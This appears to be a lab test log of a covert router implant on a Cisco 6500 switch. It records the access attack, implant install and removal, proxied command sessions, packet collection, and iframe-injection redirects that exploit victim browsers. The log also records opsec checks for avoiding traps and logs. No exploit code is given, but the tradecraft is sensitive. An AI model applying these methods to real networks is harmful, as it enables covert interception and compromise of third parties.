Cytolysis-1h Testing
HG was delivered for Cytolysis on 10/12/2015 for SUP720.  Testing scope will include SMITE, ACE, Redirection and Packet Collection capabilties.  
 
CONOP will be:

Hop through 3 flux nodes - 1 internet, 1 osmo subnet, 1 osmo mgmt subnet - and attack mgmt VLANVirtual Local Area Network 1 ip address - 0.108 from a host that is allowed vty access via acl 2
Establish CTCounter Terrorism session back through flux node 4
Use ACEApplication Control Engine (Module) commands to verify state of the device
Use socket get_arp_survey_data and output of "show ip nat trans" to survey traffic from VLANVirtual Local Area Network 19
SMITE hosts on target customer network - VLANVirtual Local Area Network 19

Testing Summary

Note in test report that module 2 is in state PwrDown and should be verified before proceeding
5 second CPU spikes to around 40% during IACInternational Access Code attack
Trigger packets that go through the target due to HG trigger sequence mis match will be caught and logged by outbound customer ACLs potentially - we will trigger to IP of device on port UDPUser Datagram Protocol 161.
Comms packets are SSLv3 - need to consider if this is noticeable on this network
Can only SMITE to /32 destinations
HG-11 - Return web traffic that matches a SMITE rule is denied by ACL
HG-12 - Print for return traffic
Hardware difference between test device and target - daughter card on 4 port 10G line card is a WS-F6700-DFC3B on target.  Test device has a WS-F6700-DFC3BXL - difference seems to be in amount of memory/scalability.  Both support distributed forwarding, MPLS and ACEApplication Control Engine (Module) counters, however XL model has 1GB memory on interface module and can support 1 million ipv4 routes and 256KB netflow entries.  Target device 3B model has 256MB memory on interface module and can only support 256KB ipv4 route entries and 128KB netflow entries.

DUT IOSApple operating system for small devices - sup-bootdisk:s72033-ipservices_wan-mz.122-33.SXI.bin
DUT ROMRead-Only Memory - ROM: System Bootstrap, Version 12.2(17r)SX5, RELEASE SOFTWARE (fc1)

OSPF running with Osmo-3 routers, rx equal-cost default route from two OSPFOpen Shortest Path First peers over Uplinks, along with other OSPFOpen Shortest Path First routes.
Uplinks to Osmo-3 routers - one on 10G interface, other on 1G interface (target may actually have two 10G uplinks, however I do not have two 10G routers to link to).
10GB Uplink uses ISL trunk encapsulation, 1GB uplink uses dot1q (that module on 6509 does not support ISL trunking)
Customer 2 is the target traffic, Customer 1 is just additional traffic.  Customer routers replicated with 3750s.
Customer 2 target network is NAT'd by the DUT
Hop through three flux nodes to attack - one on Internet and two on Osmo network.  Final Flux node on CONTROL network hanging off Osmo router.
SNMP monitoring, Syslog and trap logging set up to Solarwinds
Port mirror set up for VLANVirtual Local Area Network 3 and 47
Config differences between Target and DUT
ip name server 4.4.4.4 added
power mode combined
no power enable module 2 - not sure why their slot 2 is PwrDown without this command
g1/48 configured as an Uplink with dot1q encap and removed from SPAN for VLANVirtual Local Area Network 3,47
logging/snmp host statements and acl 2 changed for 10.9.8.22
added 1.1.1.1 as ntp server and added to acl Core-Net-filter-in.

Restarted ACEMod again - verified ability to run ACEApplication Control Engine (Module) commands


Ad -Hoc test - re-attack
Started with a clean device - it had been reloaded but an IXIA test had been run on it
Verified 3 flux hops in use
Verified OSPFOpen Shortest Path First and logging
IAC attacked - CPU spike during IACInternational Access Code attack - 39%
Observed same SNMPSimple Network Management Protocol trap during IACInternational Access Code attack
Uploaded HG - no trap or CPU issues
Established CTCounter Terrorism session - notice very small spike during SSLSecure Socket Layer establishment - 15% in five second CPU
When choosing a host to impersonate - chose 10.0.11.1 and it was NATd out and established back to my flx node as XXX.XXX.X.XX (TOPWAY-NET[CN]).
Uninstalled HG with device uninstall -mp -f command
Re-attacked with IACInternational Access Code and uploaded HG - established CTCounter Terrorism session successfully.
Uninstalled again.
Repeated attack again. successful
Uninstalled again.
Repeated attack again - successful
All of these repeat attacks were on same RP, no failover or reload.  Will test repeat attacks after failover as part of sup failover testing.


ACE Module capability testing
HG installed from previous test
Establish CTCounter Terrorism session and execute ACEApplication Control Engine (Module) commands - show ver, show ip int br, show module, show arp, show mac address-table, show log, show int vlan 1, show platform hardware capacity, sh tcam counts, show run, show run int vlan 2, wr mem, clear ip nat trans * (this killed my ct session), show access-list, show vlan, show ip route, show power, show environment, show ntp a, show ip sockets, show mod power, show mod integrity, show sup-bootflash:, clear arp, 
Powered down line card in slot 2 at CLI
No issues observed during power down of line card
Disconnected and reconnected CTCounter Terrorism session
Entered some incorrect commands to test boundaries - asdfhsaj, show *, show run | beg line <-cannot run this
Attempting to run copy command "copy run sup-bootflash:" created a file called exit on the bootflash with the running config in it.  Deleted this file.
Running "copy run sup-bootflash:config" also creates a file called exit.
Running "delete sup-bootflash:config" via ACEApplication Control Engine (Module) does not delete the file
None of the ACEApplication Control Engine (Module) commands show in output of "show history"
show history does not seem to show the actual history - just has an entry for "show history"
Documentation for ACEApplication Control Engine (Module) module says that only show commands are supported - maybe commands other than show should be blocked by ilm or CT.CMD: 'show mod ' 01:27:14 C6506 Fri Nov 6 2015CMD: 'show mod power' 01:27:19 C6506 Fri Nov 6 2015CMD: 'showcytolysis-1#



OIR/shutdown/startup of modules with HG
Powered module 2 up and down administratively 3 times with HG installed.  Verified CTCounter Terrorism session establishment between each state transition, no CTCounter Terrorism session during state transition.
Powered up/down module 2 adminisitratively 3 times while CTCounter Terrorism session active.
Disconnected HG session and performed 3 hw-module resets on slot 2. then verified ct session.
Disconnected HG session and performed a hw-module reset on each slot 1 - 3 and then verified CTCounter Terrorism session
With CTCounter Terrorism session active, performed an OIR card removal on slot 2.  Then disconnected and reconnected to CT
With CTCounter Terrorism active, performed an OIR card insertion on slot 2 then disconnected and connected CT.


SMITE capability Smoke Test

Test Packet Collection
Will smoke test packet collection of DNSDomain Name System packets to identify DNSDomain Name System servers in use by target hosts and web destinations per the CONOPConcealed Operation discussion
Verified Seeds traffic is working from VLANVirtual Local Area Network 3 and VLANVirtual Local Area Network 19
Enabled a packet collection rule - collect create 0.0.0.0 0.0.0.0 53 53 10.11.0.13 255.255.255.255 udp -en -t 15s
When rule is enabled, traffic doesn't flow and nothing is collected
Tried several variations on the rule and found that if I use 4.4.4.4 as the destination host, the traffic stops, but i do actually get collection results


Generating Baseline performance test
Running two hour test with no HG - HG was uninstalled and then device was powered off for 20seconds and then powered back up
Ran IXIA for 2 hour test.
Collected results - Cytolysis-1h_56-Baseline-no-hG-Test8


Generate Another Baseline with more traffic
Running two hour test with no HG - same test as test 8 except with more traffic flowing through
Collected results - Cytolysis-1h_58-Baseline-no-HG-Test9


Performance test - same as Test 9 but with HG, no rules active
test kicked off at 2:30PM on Friday
compared results of test 9 and 10.  Found no difference in CPU % as reported by Solarwinds.  Found only small difference in Used memory in solarwinds, which is expected because with HG installed, output of show mem does show some additional used memory.  Difference in memory was - 25.9% utilized without HG, 26.6% utilized with HG
IXIA report - no significant difference in report observed in the following areas - Agg Appsim - IP Summary, TCPTransport Control Protocol Setup time, TCPTransport Control Protocol Response Time, TCPTransport Control Protocol close time, TCPTransport Control Protocol summary, Frame latency summary, UDPUser Datagram Protocol summary.  Under Component summary, the Maximum Client Establish rate was lower with HG installed - 8990 vs 5330.  This is something to watch with subsequent tests of performance with either rules active or with additional traffic.  In this same section, TCPTransport Control Protocol flow rate was lower with HG as well.   Application Summary showed only a handful more errors with HG (~100).
Checked individual component stats in test report and it seems that cust1 component performed well - the other three are the ones with the decreased rate of max client establishment/TCP flow rate.  Those three all involve subnet flx2, whlie cust1 test flows to services.  Could be something to investigate - whether there is an issue with sending traffic out the uplink interface on vlan 2 versus sending traffic to other interfaces/vlans on the DUT.


Opsec review
Observed known issues in show tech - init process missing from show stacks and output of show mem shows higher Used mem with HG
After HG uninstalled - Init process back, no anamolous output


Ad-hoc - Administrator commands testing
with HG installed, perform system administrator functions, kicked off ixia to run background traffic
Added and deleted vlan interface and associated vlan, various show commands, bounced vlan 2 interface, added/deleted a user, clear counters, clear access-list counters, clear cef table
Observed that IP that I am impersonating for CTCounter Terrorism session has a receive adj when directly queried however does not show up in show ip cef detail.  Also ping to that host failed until I disconnected CTCounter Terrorism session, at which point the cef RAA was dropped and traffic to that host resumed.  This is expected behavior based on HG-11.
test cef commands, test diagnostic all on slot 3, show tech, show ip cef commands (known observables), created and deleted new port mirror, changed console and buffer logging levels, clear arp and clear mac address table, deleted and re-added acl from vty lines, deleted and re-added acl from vlan 2 and vlan 19, term len 0, show run


Ad-hoc test - Add latency to ICON machine
Uninstalled HG
Added latency - 1000ms to ICON workstation
IAC attacked - IACInternational Access Code attack failed - LG ECEdgeCase 133 DHE - 133 is "Router issue command failed".  Follow up to see if this is related to re-attack or additional latency.
Reduced latency to 500ms - IACInternational Access Code attack - Attack and HG upload successful 0- LGDTHM
Established CTCounter Terrorism session successfully with 500ms
Uninstalled HG and reloaded DUTDevice Under Test to try again with 1000ms of latency - successfully attacked and installed, establsihed CTCounter Terrorism session with latency
Repeated test with 1000 ms successfully


Verifying result of performance testingRan iterations 61 and 62 of same test - reload DUT, then run test each time.  Generated a comparison report.  Results are not 100% consistent with previous results.  Still looking into report.

Run Stack Scrambler test with HG installed - 2h
Ran Stack Scrambler test with HG installed - 8 hour - no crashes or prints
Ad hoc test - reload during HG upload
Started with a clean DUT
IAC attacked
Reloaded Device at 97% HG upload complete
Verified no prints or traps sent, router reloaded normally
Successfully re-attacked and uploaded HG


Ad hoc - perform admin functions during HG upload
performed show tech during HG upload
bounced power to module 2 during Hg upload
Performed show commands
DId not obbserve any anamolous output on console or traps


Ad hoc - collect wireshark of comms traffic
collected with wireshark on ICON machine while establishing CTCounter Terrorism session
ct-session.pcapng saved to / on ICON
SSLv3 packets
Certificate handed out by Cutthroat is the same as used in previous releases of HG - need to confirm but this is signature issue



IXIA test - without interface commands
With HG installed Increased IXIA traffic to 100k flows and 10M on IXIA - observed many failures
Removed ip verify unicast commands from VLANVirtual Local Area Network 19 - observed many failures
Removed acls from vlan 2 and vlan 19 - observed many errors
Removed nat statements - router crashed.  Collected show info
Reloaded DUTDevice Under Test and configured with no ip verify unicast, no acls and no nat
Started traffic - running without errors - still no HG at this time
During test, IACInternational Access Code attacked and installed HG, established CTCounter Terrorism session, uninstalled HG - no errors
Reloaded and added back all interface and acl configurations
Running test with no HG, 10M traffic and 1000 superflows with success.

Verified packet queues - no packets queued
Verified what is going to RP - src 10.11.0.10 - dns to 4.4.4.4, 443 to X.X.X.XX (LVLT-GOGL-8-8-8[US]), icmp to X.X.X.XX (LVLT-GOGL-8-8-8[US]). src XXX.XXX.X.XX (TOPWAY-NET[CN]) - only ICMPInternet Control Message Protocol to XXX.XXX.X.XX (TOPWAY-NET[CN]).
Installed HG and verified all three CPUs - values were the same within 1%.  
Verified that netdr command is seeing the change in RP traffic due to HG assist on CTCounter Terrorism impersonated host
Kicked off IXIA test - CPU looks normal so far - around 6% for RP, same level as before for SP and DFC


Testing new version of IACInternational Access Code - had previously completed a smoke test of new IAC
Kicked off IXIA test - Cytolysis High
Uninstalled HG
Verified Solarwinds not currently loogging any SNMPSimple Network Management Protocol traps and monitoring tcpdump on 4.4.4.4 for DNSDomain Name System queries from XXX.XXX.X.XX (TOPWAY-NET[CN])

Re-attacked with IAC
IAC attack completed without sending any SNMPSimple Network Management Protocol traps or DNSDomain Name System queries
Uploaded HG and established CTCounter Terrorism session with no problem
Unininstalled HG
Repeated three times
Attacked with IACInternational Access Code three times in a row - no traps or dns queries, output shows LGDTHM
Uploaded HG
Tested with ACEApplication Control Engine (Module) using show users command - show users issues through ACEApplication Control Engine (Module) does not initiate a DNSDomain Name System query, even with a separate login
Increased CUst2 IXIA traffic to 10k flows.  Failure rate increased as expected
Allowed test to run for maybe ten minutes with failures incrememting
Uninstalled HG through CLICommand-Line Interface and let the test run for ten more minutes - about 15k active translations
Re-attacked and installed HG, establish CTCounter Terrorism session
Created a smite rule for an IXIA source and destination from 10.11.0.50 to XXX.XXX.XX.XX (TOPWAY-NET[CN]).
Monitored packet assist - hihgest observed was 310 packets per second
Verified assist was in place with show ip cef <ip>
RP/SP/DFC CPU was not impacted by the one SMITE rule.
Deleted and re-added the rule several times
Reset the stats for packet assist by re-entering packet assist parameters 1500/3000
Added the rule but not enabled, enabled, then disabled and deleted the rule
Created three rules to different destinations, verified show ip cef receieve adjacencies.  packet assist threshold at 300
Exceeded packet assist threshold and assists did drop.  Rules still appear to be enabled however.  disabling and re-enaling rule re-establishes the assist.


Test assist remove
Created a mitm iframe rule, verified the assist in show ip cef.
Performed a device uninstall - verified that the assist was dropped after a few seconds.


CPU Scaling test
Adjusted IXIA cust 2 levels to 1000 flows and 5M in order to simulate what I see in show proc cpu hist on target
Verified CPU levels and installed HG to see impact on overall level (nto 5s CPU)
At these traffic levels, HG seemed to add about 2% to 1min/5 minute CPU


Performance characterization - collecting all three CPUs and memory without traffic and hg, with traffic-no hg, with traffic and hg
Found that HG install added maybe 1% to RP CPU, SP CPU and nothing to linecard CPU  - files saved in testing folder.
Reloaded device at 10:05.  No HG and no traffic for several hours - only seeds from cust1host. Collected SWSoftware and show proc cpu data.
Added new HG delivery Friday morning - allow to run over the weekend with no traffic - only seeds from cust1host.  Confirmed no SNMPSimple Network Management Protocol Trap or DNSDomain Name System query during IAC.  Peak CPU during IACInternational Access Code was 62%.  Peak CPU during HG upload was 18%.  These were only 5 second values.  Screenshots show reported Solarwinds values.
Verified that new delivery fixes IACInternational Access Code and filterbroker module starts automatically now.  Exited CTCounter Terrorism session.


Smoke test of features
Ran through all ACEApplication Control Engine (Module) commands documented on Cytolysis page as well as socket get_arp_survey_data
Opened Victim3 and web browsed to google - saw the following print:cytolysis-1#Nov 27 19:57:09.354 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(3796), 1 packet
In addition page didn't load completely - first two pictures loaded only.

Cleared cache on Victim 3 and repeated browsing to google, this time successful page load and no print.  Repeated this three times with no further problem.
Waiting for nat to clear out and then repeating the attempted web browsing.  While waiting for NATNetwork Address Translation to clear out, rx the print again, although I was not actively browsing and IEInternet Explorer was closed:cytolysis-1#Nov 27 20:02:10.862 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(80) (Vlan2 0015.fa80.efbf) -> 10.11.0.13(3796), 40 packets

After nat cleared, attempted to browse again, this time successfully with no print.
Browsed successfully for the first time to 100.100.40.3 and 100.100.40.4 successfully as well, no print.
went down to get lunch, came back and attempting again to browse after cache cleared and it sat for a bit.
All three pages loaded successfully.
Trying from victim1 -
Confluence lost a bunch of notes, trying to recreate them
I was able to browse successfully from all other hosts with no prints.
Created iframe rule to match victim 3.  At first i just web browsed from other hosts to X.X.X.XX (LVLT-GOGL-8-8-8[US]) to make sure that still worked and it did, no problems.  then i tried from victim 3 - unsuccessful exploitation and also prints:Nov 27 20:41:46.263 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3839), 1 packetNov 27 20:44:54.519 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3843), 1 packetNov 27 20:47:12.311 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3839), 6 packetsNov 27 20:49:18.107 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3885), 1 packetNov 27 20:50:12.407 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3843), 6 packetscytolysis-1#Nov 27 20:55:55.355 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3980), 1 packetNov 27 20:56:24.075 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(3985), 1 packetNov 27 20:59:50.043 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(4031), 1 packetNov 27 20:59:51.639 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(4028), 1 packetNov 27 21:00:12.727 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied udp 10.9.8.22(137) (Vlan2 0021.d80d.cfc1) -> XXX.XXX.X.XX (TOPWAY-NET[CN])(137), 3 packetsNov 27 21:00:14.859 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(4072), 1 packetcytolysis-1#

With multiple attempts - successfully exploited about 1/3 of the time, also rx these prints every time.  packet assist threshold made it to a max of 96.  Had to use bf flag on smite rule to work.
Uninstall HG, reload device, attempt again to see if prints still occur without HG.
Device clean, victim 3 restarted.  attempting to web browse to X.X.X.XX (LVLT-GOGL-8-8-8[US]) from victim 3 - looking for prints first observed in step b.  
At first try, page didn't load - seemed hung.  However no prints observed.  Refreshed and page loaded successfully.
Restarting victim 3, cleared nat trans.  
Was able to get to web page successfully on all attempts, from all hosts.  I then browsed directly to windex using iframe url and was successfully exploited.  No prints at any time to console.
Reating test.  Restart router and victim 3
Browsed around from all hosts - no prints.  Pages loaded successfully.  Broswed directly to windex and successfully was exploited.  no prints.  Repeated the exploitation three times.  no prints, all four total attempts successful
Reinstall HG and repeat tests
After HG installed, I web browsed from all hosts - no prints for return traffic from X.X.X.XX (LVLT-GOGL-8-8-8[US]) to victim 3 as noticed on first browsing attempt earlier.  Was able to successfully repeat web browsing directly to windex to exploit with no prints.  However, when injecting iframe with SMITE rule, result was same as previous - acl logging prints.  exploitation not consistently successful.cytolysis-1#Nov 27 22:36:57.507 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2372), 1 packetcytolysis-1#Nov 27 22:38:04.791 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(8888) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2510), 1 packetNov 27 22:38:06.451 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2503), 1 packetNov 27 22:38:07.503 C6506: %SEC-6-IPACCESSLOGP: list Core-Net-filter-in denied tcp X.X.X.XX (LVLT-GOGL-8-8-8[US])(7777) (Vlan2 0021.d80d.cfc1) -> 10.11.0.13(2505), 1 packetNov 27 22:38:11.463 C6506: %SEC-6-IPACCESSLOGRL: access-list logging rate-limited or missed 3 packets

Broswed away from the redirected page and saw that the number of active sessions is now 0
repeated test once - same result.
time expired on rule - noticed that the rule still showed active for some time after the time had expired, it took a bit for the rule to update and show disabled in output of redir show.  But it did update, time remaining showed 0, sessions remaining 1, enabled no.  browsing to google was not redirected from target host.
Repeated the test, this time getting all three sessions redirected before rule had expired.
Verified that I was able to redirect three times, and then after that subsequent connections went to google.  Rule changed to disabled.  packet assist pps only at 3.
re-added the rule - verifed that i can still browse from .14 to other web destinations without a problem
re-added the rule and verified that i can browse normally to google and other web destinations from cust1host1, seeds, victim1,2,3.
re-added the rule and verfied that 443 traffic was not redirected while 80 was by testing from victim 4 to https://www.google.com

Looking for punch throughs - enabled rule with no time limit or max sessions.  watched tcpdump on X.X.X.XX (LVLT-GOGL-8-8-8[US]) - no punch throughs when I opened 6 new windows and browsed from all windows at the same time, mutliple times,clearing the local files between.

These are slightly different from the prints that were previously observed since they are for return traffic from the web server targeted by the smite rule, not for the return traffic from windows.  This may be expected behavior since the pps threshold has tripped:
